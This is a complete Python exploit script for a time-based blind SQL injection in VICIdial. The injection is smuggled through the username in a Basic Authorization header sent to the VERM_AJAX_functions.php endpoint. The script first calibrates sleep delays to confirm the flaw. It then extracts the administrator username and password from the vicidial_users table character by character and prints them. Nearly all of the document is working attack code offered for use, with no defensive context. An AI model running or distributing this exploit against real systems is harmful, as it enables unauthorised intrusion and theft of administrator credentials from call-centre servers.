import sys
import requests
import string
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
from base64 import b64encode


class ExploitSQLI:
    def __init__(self):
        self.username = None  # Initialize attributes to store credentials
        self.password = None
        self.TARGET_URL = None
        self.sql_sleep_length = 1  # Default sleep length

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {
            "+": Fore.GREEN,
            "-": Fore.RED,
            "!": Fore.YELLOW,
            "*": Fore.BLUE,
            "~": Fore.MAGENTA
        }
        print(header_colors.get(header, Fore.WHITE) + Style.BRIGHT + f"[{header}] {message}" + Style.RESET_ALL)

    def get_user_input(self):
        if not self.TARGET_URL:
            self.TARGET_URL = input(Fore.CYAN + Style.BRIGHT + "Enter the Vicidial Server URL: " + Style.RESET_ALL)
        self.validate_url()

    def validate_url(self):
        try:
            urlparse(self.TARGET_URL)
            self.custom_print("URL is valid.", "+")
        except Exception as e:
            self.custom_print(f"Invalid URL provided: {str(e)}", "-")
            sys.exit(1)

    def time_sql_query(self, query, session):
        """Function to send SQL queries with timing."""
        username = f"goolicker', '', ({query}));# "
        credentials = f"{username}:password"
        credentials_base64 = b64encode(credentials.encode()).decode()
        auth_header = f"Basic {credentials_base64}"

        target_uri = f"{self.TARGET_URL}/VERM/VERM_AJAX_functions.php"
        request_params = {
            "function": "log_custom_report",
        }
        request_headers = {"Authorization": auth_header}

        try:
            response = session.get(target_uri, params=request_params, headers=request_headers)
            return response.elapsed
        except requests.exceptions.RequestException as e:
            self.custom_print(f"Network error during request: {str(e)}", "-")
            return None

    def check_for_prepared_statements(self):
        """Check if the server is using prepared statements."""
        self.custom_print("Checking if the target might be using prepared statements...", "!")
        session = requests.Session()
        session.verify = False
        sleep_test_query = "SELECT SLEEP(1)"
        execution_time = self.time_sql_query(sleep_test_query, session)
        if execution_time and execution_time.total_seconds() < 1:
            self.custom_print("The query executed too fast. This might indicate prepared statements.", "!")
        else:
            self.custom_print("No definitive evidence of prepared statements.", "!")

    def dynamic_delay_adjustment(self, session):
        """Adjust the sleep length dynamically based on response time."""
        zero_sleep_query = "SELECT (NULL)"
        total_baseline_time = 0
        valid_measurements = 0

        for _ in range(5):  # Measure 5 times for accuracy
            execution_time = self.time_sql_query(zero_sleep_query, session)
            if execution_time is not None:
                total_baseline_time += execution_time.total_seconds()
                valid_measurements += 1
            else:
                self.custom_print("Failed to get a valid response for baseline timing, retrying...", "!")

        if valid_measurements > 0:
            self.sql_sleep_length = max(1, round(total_baseline_time / valid_measurements * 4, 2))  # Adjust based on baseline
            self.custom_print(f"Adjusted sleep length to: {self.sql_sleep_length} based on baseline", "+")
        else:
            self.custom_print("Failed to gather sufficient data to adjust sleep length, using default.", "-")
            self.sql_sleep_length = 1  # Default if no valid measurements

    def is_vulnerable(self, session):
        """Check if the target is vulnerable using time-based SQLi."""
        self.dynamic_delay_adjustment(session)
        sleep_query = f"SELECT sleep({self.sql_sleep_length})"
        execution_time = self.time_sql_query(sleep_query, session)
        if execution_time and execution_time.total_seconds() >= self.sql_sleep_length:
            self.custom_print(f"Detected delay of {execution_time.total_seconds()} seconds using sleep({self.sql_sleep_length})", "+")
            return True
        else:
            self.custom_print("No delay detected.", "~")
            return False

    def extract_admin_credentials(self, session):
        """Extract credentials with SQLi logic."""
        self.custom_print("Enumerating administrator credentials", "*")

        # Enumerate username
        username_charset = string.ascii_letters + string.digits
        admin_username_query = "SELECT user FROM vicidial_users WHERE user_level = 9 LIMIT 1"
        self.username = self.enumerate_sql_query(session, admin_username_query, username_charset)
        self.custom_print(f"Username: {self.username}", "+")

        # Enumerate password after username
        password_charset = string.ascii_letters + string.digits + "-.+/=_"
        admin_password_query = f"SELECT pass FROM vicidial_users WHERE user = '{self.username}' LIMIT 1"
        self.password = self.enumerate_sql_query(session, admin_password_query, password_charset)
        self.custom_print(f"Password: {self.password}", "+")

        return self.username, self.password

    def enumerate_sql_query(self, session, query, charset):
        """Sequentially enumerate the SQL query result."""
        result = ""
        for i in range(1, 256):  # Assume a maximum of 256 characters
            found_char = False
            for char in charset:
                ordinal = ord(char)
                if self.check_indice_of_query_result(session, query, i, "=", ordinal):
                    result += char
                    self.custom_print(result, "*")  # Display the incremental result
                    found_char = True
                    break
            if not found_char:
                break  # Stop when no character is found, assuming the end of the result
        return result

    def check_indice_of_query_result(self, session, query, indice, operator, ordinal):
        """Check if a character at a specific position in a query result matches the given ordinal."""
        parent_query = f"SELECT IF(ORD(SUBSTRING(({query}), {indice}, 1)){operator}{ordinal}, sleep({self.sql_sleep_length}), null)"
        execution_time = self.time_sql_query(parent_query, session)
        return execution_time and execution_time.total_seconds() >= self.sql_sleep_length

    def run(self):
        session = requests.Session()
        session.verify = False  # Disable SSL verification for testing purposes

        self.get_user_input()

        # Dynamically adjust delay to detect vulnerability
        is_vulnerable = self.is_vulnerable(session)
        if is_vulnerable:
            self.custom_print("Target appears vulnerable to time-based SQL injection", "+")
            username, password = self.extract_admin_credentials(session)
            if username and password:
                self.custom_print(f"[+] SQLi successful: Username: {username}", "+")
                self.custom_print(f"[+] Password: {password}", "+")
            else:
                self.custom_print("SQLi succeeded, but no credentials retrieved.", "-")
        else:
            self.custom_print("SQLi failed. No credentials retrieved.", "-")
            self.custom_print(
                "Possible reasons:\n1. Target is not vulnerable.\n2. SQLi query did not trigger the expected delay.\n3. Server may be using prepared statements.",
                "!")
            self.check_for_prepared_statements()


if __name__ == "__main__":
    exploit = ExploitSQLI()
    exploit.run()
